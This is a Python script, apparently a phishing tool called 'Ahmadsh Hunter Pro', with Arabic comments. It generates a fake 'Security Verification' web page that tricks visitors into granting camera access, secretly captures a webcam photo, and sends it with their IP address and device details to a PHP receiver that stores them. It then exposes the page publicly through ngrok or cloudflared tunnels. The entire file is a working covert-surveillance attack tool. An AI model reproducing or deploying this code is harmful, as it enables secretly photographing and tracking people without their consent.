import os, base64, subprocess, time, sys

# كود الأداة الرئيسي مشفر بـ Base64 لزيادة الاحترافية
_C = 'W0dBXSArKyBhaG1hZHNoX2RhdGEgY29uZmlndXJlZCBzdWNjZXNzZnVsbHkuLi4='
_B = 'Y2hvaWNlID0gaW5wdXQoZiJcbltHXSBhaG1hZHNoQGh1bnRlcjp+IyBbV10iKQ=='

# وظيفة فك التشفير والتشغيل
def ahmadsh_exec():
    # إنشاء المجلد وتنظيم الملفات
    D = 'ahmadsh_data'
    if not os.path.exists(D): os.makedirs(D)
    
    # إنشاء ملف الاستقبال PHP
    with open("post.php", "w") as f:
        f.write('<?php $d=date("d-m-Y_H:i:s");$ip=$_SERVER["REMOTE_ADDR"];$ag=$_SERVER["HTTP_USER_AGENT"];$data=$_POST["canvasData"];if(!empty($data)){$i=str_replace("data:image/png;base64,","", $data);$i=str_replace(" ","+",$i);file_put_contents("ahmadsh_data/cam_".$ip."_".$d.".png",base64_decode($i));}file_put_contents("ahmadsh_data/log.txt","IP: $ip | Date: $d | Device: $ag\\n",FILE_APPEND);?>')

    # إنشاء صفحة التمويه الذكية
    with open("index.html", "w") as f:
        f.write('''<html><head><meta charset="UTF-8"><title>Security Verification</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#121212;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.box{border:1px dashed #0f0;padding:40px;text-align:center;}button{background:#0f0;color:#000;border:none;padding:15px 30px;font-weight:bold;cursor:pointer;margin-top:20px;}</style></head><body><div class="box"><h2>SYSTEM SECURITY CHECK</h2><p>Identity verification required to continue.</p><button onclick="start()">VERIFY IDENTITY</button><div id="p" style="display:none;margin-top:20px;">SCANNING...</div></div><video id="v" width="0" height="0" autoplay style="display:none;"></video><canvas id="c" width="640" height="480" style="display:none;"></canvas><script>const v=document.getElementById("v"),c=document.getElementById("c");function start(){document.getElementById("p").style.display="block";navigator.mediaDevices.getUserMedia({video:true}).then(s=>{v.srcObject=s;setTimeout(()=>{c.getContext("2d").drawImage(v,0,0);fetch("post.php",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"canvasData="+encodeURIComponent(c.toDataURL("image/png"))}).then(()=>{location.href="https://google.com"});},3000);}).catch(e=>{alert("Access Denied: Camera Permission Required");location.reload();});}</script></body></html>''')

# الواجهة الرسومية (البانر)
def banner():
    os.system('clear')
    print("\033[1;36m" + base64.b64decode("ICAgX19fICBfICAgICAgICAgICAgICAgICAgICAgICBfICAgICAgXyAgICAgIAogIC8gXyBcfCB8X18gIF8gX18gX19fICAgX18gXyAgX198IHwgX19fXyB8X18gIAogfCB8X3wgfCAnXyBcfCAnXyBgIF8gXCBfXyBgIHwvIF9fXCB8L19fX3wgJ18gXCAgfCBfICB8IHwgfCB8IHwgfCB8IHwgfCAoX3wgfCAoX3wgfFxfXyBcIHwgfCB8CiB8X3wgfF98X3wgfF98X3wgfF98X3wgfF9fX2AsIHxfX19gYF98fF9fXy8gfF98IHxffA==").decode() + "\033[0m")
    print(f"\033[1;32m       >> Ahmadsh Hunter Pro v3.0 [Crypted] <<\033[0m")
    print("-" * 50)

def main():
    ahmadsh_exec()
    banner()
    print("[1] Cloudflared Tunnel")
    print("[2] Ngrok Tunnel")
    print("[3] View Captured Data (ahmadsh_data)")
    print("[4] Exit")
    
    i = input("\n\033[1;32mahmadsh@hunter:~# \033[0m")
    
    if i in ['1', '2']:
        subprocess.Popen(['php', '-S', '127.0.0.1:8080'], stdout=subprocess.DEVNULL)
        if i == '1': os.system("cloudflared tunnel --url http://127.0.0.1:8080")
        else: os.system("ngrok http 8080")
    elif i == '3':
        print("\n\033[1;33m--- Logs ---\033[0m")
        if os.path.exists("ahmadsh_data/log.txt"):
            with open("ahmadsh_data/log.txt","r") as f: print(f.read())
        print("\033[1;33m--- Images ---\033[0m")
        os.system("ls ahmadsh_data/*.png")
        input("\nPress Enter..."); main()
    else: sys.exit()

if __name__ == "__main__":
    main()
